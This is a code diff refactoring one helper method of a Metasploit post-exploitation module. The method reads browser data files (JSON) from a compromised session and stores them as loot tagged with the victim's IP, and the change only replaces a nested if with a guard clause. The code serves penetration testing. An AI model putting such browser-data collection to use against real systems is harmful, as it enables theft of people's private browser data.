@@ -488,17 +488,17 @@ class MetasploitModule < Msf::Post
   end
 
   def extract_json_data(json_path, data_type, browser)
-    if file?(json_path)
-      json_data = read_file(json_path)
-      browser_clean = browser.gsub('\\', '_').chomp('_')
-      timestamp = Time.now.strftime('%Y%m%d%H%M')
-      ip = session.sock.peerhost
-      file_name = store_loot("#{browser_clean}_#{data_type}", 'application/json', session, json_data, "#{timestamp}_#{ip}_#{browser_clean}_#{data_type}.json", "#{browser_clean} #{data_type.capitalize}")
-      file_size = ::File.size(file_name)
+    return unless file?(json_path)
+    
+    json_data = read_file(json_path)
+    browser_clean = browser.gsub('\\', '_').chomp('_')
+    timestamp = Time.now.strftime('%Y%m%d%H%M')
+    ip = session.sock.peerhost
+    file_name = store_loot("#{browser_clean}_#{data_type}", 'application/json', session, json_data, "#{timestamp}_#{ip}_#{browser_clean}_#{data_type}.json", "#{browser_clean} #{data_type.capitalize}")
+    file_size = ::File.size(file_name)
 
-      if file_size > 2
-        print_good("└ Extracted #{data_type.capitalize} to #{file_name} (#{file_size} bytes)")
-      end
+    if file_size > 2
+      print_good("└ Extracted #{data_type.capitalize} to #{file_name} (#{file_size} bytes)")
     end
   end
 
